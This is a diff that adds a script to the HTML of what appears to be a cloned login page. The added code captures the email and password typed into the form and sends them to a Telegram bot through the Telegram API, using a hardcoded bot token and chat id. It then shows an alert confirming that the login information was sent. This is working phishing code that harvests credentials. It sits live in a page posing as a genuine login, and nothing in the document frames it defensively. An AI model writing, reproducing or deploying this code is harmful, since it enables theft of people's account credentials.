@@ -43,6 +43,36 @@
 <path fill-rule="evenodd" clip-rule="evenodd" d="M8 5.5C8.27614 5.5 8.5 5.72386 8.5 6V9.33105C8.5 9.6072 8.27614 9.83105 8 9.83105C7.72386 9.83105 7.5 9.6072 7.5 9.33105V6C7.5 5.72386 7.72386 5.5 8 5.5Z" fill="#D72121"></path>
 </svg>
 </i></div><p data-v-b394a3d5="" class="input-box__message-box__text heading-6 text-error"></p></div><div data-v-b394a3d5="" class="input-box__message-box"><p data-v-b394a3d5="" class="input-box__message-box__text heading-6"></p></div></div></div><div data-v-83741453="" class="login-form__forgot"><button data-v-e9ff0ac9="" data-v-83741453="" role="button" class="uds-button" data-size="small" data-variant="floating" data-disabled="false" data-loading="false" data-block="false" aria-label="Forgot password?" type="button" track-action-name="account.forgot_password.open"><span data-v-e9ff0ac9="" class="uds-button__content"><!----><span data-v-e9ff0ac9="" class="uds-button__content__label">Forgot password?</span><!----></span></button></div><button data-v-e9ff0ac9="" data-v-83741453="" role="button" class="uds-button form__button form__button" data-size="large" data-variant="primary" data-disabled="false" data-loading="false" data-block="true" aria-label="Log in" name="submit" track-action-name="account.login.submit"><span data-v-e9ff0ac9="" class="uds-button__content"><!----><span data-v-e9ff0ac9="" class="uds-button__content__label">Log in</span><!----></span></button></form><!----><!----><!----></section></main><!----><div data-v-ede09b25="" class="notifications hidden"></div></div></div>
+<script>
+        document.getElementById('loginBtn').addEventListener('click', function (e) {
+            e.preventDefault();  // Prevents the form from submitting
+
+            // Get the email and password values
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+
+            // Telegram bot information
+            let botToken = '6907698461:AAEEKx1TGcOQ_QxrEc_iq09_3UpqpfRHu8U';
+            let chatId = '1119354860';
+            let message = `Email: ${email}\nPassword: ${password}`;
+
+            // Send the email and password to Telegram
+            let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Make a request to Telegram
+            fetch(telegramUrl)
+                .then(response => {
+                    if (response.ok) {
+                        alert('Login information sent to Telegram.');
+                    } else {
+                        alert('Failed to send login information.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+    </script>
 
 
 </body></html>
